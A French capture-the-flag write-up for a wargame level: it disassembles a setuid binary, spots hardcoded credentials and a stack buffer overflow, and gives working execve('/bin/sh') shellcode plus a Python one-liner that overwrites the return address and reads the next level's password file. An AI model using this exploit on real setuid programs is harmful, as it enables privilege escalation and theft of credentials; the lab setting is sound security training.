# level 1 #

En regardant le desassemblage de ```level01```, on voit que ```main()``` demande un nom d'utilisateur puis un mot de passe, chacun verifie par une fonction dediee qui fait un ```repz cmpsb``` (equivalent d'un ```memcmp```/```strncmp``` inline) contre une chaine codee en dur.

```verify_user_name``` compare l'entree stockee dans le buffer global ```0x804a040``` (rempli par ```fgets```) contre la chaine hardcodee ```"dat_wil"``` a l'adresse ```0x80486a8```, sur ```7``` octets :

```asm
mov    edx,0x804a040       ; edx = buffer utilisateur (username saisi)
mov    eax,0x80486a8       ; eax = chaine hardcodee attendue ("dat_wil")
mov    ecx,0x7             ; longueur de comparaison = 7
mov    esi,edx
mov    edi,eax
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
seta   dl
setb   al
sub    cl,al
movsx  eax,al               ; retourne 0 si les 7 octets sont identiques
```

```verify_user_pass``` fait exactement la meme chose sur ```5``` octets, en comparant le buffer local (rempli par un second ```fgets```) contre la chaine hardcodee ```"admin"``` a l'adresse ```0x80486b0``` :

```asm
mov    eax,0x80486b0       ; eax = chaine hardcodee attendue ("admin")
mov    ecx,0x5             ; longueur de comparaison = 5
mov    esi,edx              ; esi = buffer utilisateur (password saisi)
mov    edi,eax
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
seta   dl
setb   al
sub    cl,al
movsx  eax,al               ; retourne 0 si les 5 octets sont identiques
```

Ces credentials en dur (```dat_wil``` / ```admin```) suffiraient a passer les deux verifications proprement, mais le vrai point faible du binaire est ailleurs : le second ```fgets``` (celui du password) ecrit jusqu'a ```0x64``` (100) octets dans un buffer local beaucoup trop petit sur la pile, avant meme que ```verify_user_pass``` ne soit appelee :

```asm
mov    DWORD PTR [esp+0x4],0x64   ; taille max lue par fgets = 100
lea    eax,[esp+0x1c]             ; eax = buffer local (password)
mov    DWORD PTR [esp],eax
call   8048370 <fgets@plt>
```

Ce buffer local n'a pas la place pour 100 octets avant d'atteindre l'adresse de retour sauvegardee de ```main``` : on a donc un classique **stack buffer overflow**, exploitable independamment du contenu verifie par ```verify_user_pass```.

## Exploitation

1. **Placer le shellcode dans une zone connue et stable** : on l'ecrit a la suite du username, dans le buffer global ```0x804a040``` (adresse fixe, pas d'ASLR). Le marqueur ```dat_wil ``` (8 octets, qui satisfait au passage la verification du username) precede le shellcode, qui commence donc a ```0x804a040 + 8 = 0x804a048```.

2. **Le shellcode** (```execve("/bin/sh")```) :

```asm
6a 0b                push   0xb
58                   pop    eax          ; eax = 11 (__NR_execve)
99                   cdq                  ; edx = 0
52                   push   edx           ; NULL
68 2f 2f 73 68       push   "//sh"
68 2f 62 69 6e       push   "/bin"
89 e3                mov    ebx,esp       ; ebx = "/bin//sh"
31 c9                xor    ecx,ecx       ; ecx = NULL (argv = NULL)
cd 80                int    0x80          ; execve("/bin//sh", NULL, NULL)
```

3. **Ecraser l'adresse de retour** sauvegardee du buffer password avec ```0x0804a048```, l'adresse exacte du shellcode dans le buffer username. Le padding en ```A``` comble l'espace entre le debut du buffer local et l'octet ou commence l'adresse de retour sur la pile.

4. Au ```leave``` / ```ret``` de ```main```, le programme ne revient pas dans ```__libc_start_main``` mais saute directement sur le shellcode place dans le buffer global, qui execute ```/bin/sh``` — herite des droits du binaire (setuid ```level02```).

## Solution

```
(python -c 'print ("dat_wil " + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*(255 - 21 - 8 + 80) + "\x48\xa0\x04\x08")'; echo cat /home/users/level02/.pass) | ./level01
```